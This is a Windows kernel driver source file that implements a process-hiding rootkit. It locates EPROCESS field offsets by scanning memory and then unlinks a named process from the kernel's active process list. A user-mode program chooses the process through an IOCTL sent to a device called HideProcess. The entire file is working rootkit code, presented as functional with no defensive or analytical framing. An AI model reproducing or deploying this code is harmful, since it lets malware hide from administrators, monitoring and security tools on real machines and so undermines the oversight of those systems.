#include <ntddk.h>
#include <ntstrsafe.h>
#include "Offset.h"

#define IOCTL_GET_PROCESSNAME CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

NTSTATUS IrpCreateHandler(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    // Complete the create request
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "IRP_MJ_CREATE handled\n");
    return STATUS_SUCCESS;
}

extern "C"
static ULONG pidOffset = 0, nameOffset = 0, listEntryOffset = 0;

extern "C"
BOOLEAN InitializeOffsets()
{
    nameOffset = CalcProcessNameOffset();
    pidOffset = CalcPIDOffset();
    listEntryOffset = pidOffset + sizeof(HANDLE); // LIST_ENTRY

    if (pidOffset == 0 || nameOffset == 0)
        return FALSE;
    else
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "NameOffset Address: 0x%X\n", nameOffset);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "PID Address: 0x%X\n", pidOffset);
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "ListEntry Address: 0x%X\n", listEntryOffset);
        return TRUE;
    }
}

extern "C"
VOID HideProcess(char* target)
{
    PLIST_ENTRY head, currentNode, prevNode;
    PEPROCESS eprocessStart;
    unsigned char* currentProcess = NULL;
    //target = "notepad.exe"; // Change this name as needed
    ANSI_STRING targetProcessName, currentProcessName;

    eprocessStart = IoGetCurrentProcess();
    head = currentNode = (PLIST_ENTRY)((unsigned char*)eprocessStart + listEntryOffset);
    RtlInitAnsiString(&targetProcessName, target);

    do
    {
        currentProcess = (unsigned char*)((unsigned char*)currentNode - listEntryOffset);
        RtlInitAnsiString(&currentProcessName, (const char*)((unsigned char*)currentProcess + nameOffset));

        // Compare process name
        if (RtlCompareString(&targetProcessName, &currentProcessName, TRUE) == 0)
        {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Found target process %s.\n", target);

            // Unlink the process from the list
            prevNode = currentNode->Blink;
            prevNode->Flink = currentNode->Flink;

            currentNode->Flink->Blink = prevNode;

            // Update pointers of the target process
            currentNode->Flink = currentNode;
            currentNode->Blink = currentNode;
            break;
        }

        currentNode = currentNode->Flink;
    } while (currentNode != head); // Corrects termination check
}

extern "C"
ULONG CalcPIDOffset()
{
    PEPROCESS peprocess = IoGetCurrentProcess();
    HANDLE pid = PsGetCurrentProcessId();
    PLIST_ENTRY list = NULL;
    int i;

    for (i = 0; i < PAGE_SIZE; i += sizeof(HANDLE))
    {
        if (*(PHANDLE)((PCHAR)peprocess + i) == pid)
        {
            // PLIST_ENTRY - PID
            list = (PLIST_ENTRY)((unsigned char*)peprocess + i + sizeof(HANDLE));

            if (MmIsAddressValid(list))
            {
                if (list == list->Flink->Blink)
                {
                    return i;
                }
            }
        }
    }

    return 0; // Returns 0 if the offset was not found
}

extern "C"
ULONG CalcProcessNameOffset()
{
    PEPROCESS ntosKrnl = PsInitialSystemProcess;
    int i;

    for (i = 0; i < PAGE_SIZE; i++)
    {
        if (RtlCompareMemory((PCHAR)ntosKrnl + i, "System", 6) == 6)
        {
            return i; // Returns the offset of the process name
        }
    }

    return 0; // Returns 0 if the offset was not found
}

NTSTATUS DriverDeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG bytes = 0;
    NTSTATUS status = STATUS_SUCCESS;
    char* inputBuffer = NULL;
    ULONG inputBufferLength = stack->Parameters.DeviceIoControl.InputBufferLength;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
    case IOCTL_GET_PROCESSNAME:
        // Ensure the buffer size is valid
        if (inputBufferLength == 0 || inputBufferLength > PAGE_SIZE) {
            status = STATUS_INVALID_BUFFER_SIZE;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Invalid buffer size\n");
            break;
        }

        // Ensure SystemBuffer is accessible
        inputBuffer = (char*)Irp->AssociatedIrp.SystemBuffer;
        if (inputBuffer == NULL) {
            status = STATUS_INVALID_PARAMETER;
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Invalid input buffer\n");
            break;
        }

        // Ensure safe access to the buffer
        __try {
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Received process name: %s\n", inputBuffer);

            // Call HideProcess with the process name
            HideProcess(inputBuffer);
            bytes = inputBufferLength;
            status = STATUS_SUCCESS;

        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            status = GetExceptionCode();
            DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Exception occurred: 0x%X\n", status);
        }
        break;

    default:
        status = STATUS_INVALID_DEVICE_REQUEST;
        break;
    }

    Irp->IoStatus.Status = status;
    Irp->IoStatus.Information = bytes; // Number of bytes processed
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}

// Function to unload the driver
VOID UnloadDriver(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);
    // Delete the symbolic link
    UNICODE_STRING symbolicLinkName;
    RtlInitUnicodeString(&symbolicLinkName, L"\\??\\HideProcess");
    IoDeleteSymbolicLink(&symbolicLinkName);

    // Delete the device
    IoDeleteDevice(DriverObject->DeviceObject);
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Driver unloaded.\n");
}

// Driver entry point
extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Driver loaded.\n");

    // Create Device
    UNICODE_STRING deviceName;
    RtlInitUnicodeString(&deviceName, L"\\Device\\HideProcess");
    PDEVICE_OBJECT deviceObject;
    NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &deviceObject);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Failed to create device\n");
        return status;
    }

    // Create symbolic link
    UNICODE_STRING symbolicLinkName;
    RtlInitUnicodeString(&symbolicLinkName, L"\\??\\HideProcess");
    status = IoCreateSymbolicLink(&symbolicLinkName, &deviceName);
    if (!NT_SUCCESS(status)) {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Failed to create symbolic link\n");
        IoDeleteDevice(deviceObject);
    }

    // Set IRP handler
    DriverObject->DriverUnload = UnloadDriver;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = IrpCreateHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverDeviceControl;


    if (!InitializeOffsets())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, 0, "Failed to initialize offsets.\n");
        return STATUS_UNSUCCESSFUL;
    }

    // Call HideProcess to hide the desired process
    //HideProcess();

    return STATUS_SUCCESS;
}
